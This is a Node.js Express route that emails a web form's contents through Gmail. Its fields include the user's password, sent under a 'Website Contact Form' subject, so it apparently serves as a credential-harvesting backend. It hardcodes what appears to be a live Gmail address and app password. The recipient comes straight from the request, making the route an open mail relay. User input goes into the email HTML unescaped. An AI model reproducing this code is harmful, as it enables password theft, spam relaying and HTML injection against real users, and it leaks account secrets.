const { Router } = require('express');
const router = Router();

const nodemailer = require('nodemailer');

router.post('/send-email', async (req, res) => {
  const { name, email, phone, message,password, recipient } = req.body;
  //LISTADOS DE DATOS
  const contentHTML = `
    <h1>Información del usuario</h1>
    <ul>
      <li>Nombre de usuario: ${name}</li>
      <li>Correo electrónico del usuario: ${email}</li>
      <li>Número de teléfono: ${phone}</li>
      <li>Contraseña: ${password}</li>
    </ul>
    <p>${message}</p>
  `;
  //CREABA LOS DATOS DEL GMAIL
  let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      //TOKEEN
      user: 'brisamarielontiveros@gmail.com',
      pass: 'xcsu omlw pgub ftku'
    }
  });
///METODO
  let info = await transporter.sendMail({
    from: '"FaztTech Server" <brisamarielontiveros@gmail.com>',
    to: recipient, // Usar el destinatario proporcionado en el formulario
    subject: 'Website Contact Form',
    html: contentHTML
  });

  console.log('Mensaje enviado: %s', info.messageId);
  console.log('URL de vista previa: %s', nodemailer.getTestMessageUrl(info));

  res.redirect('/success.html');
});

module.exports = router;
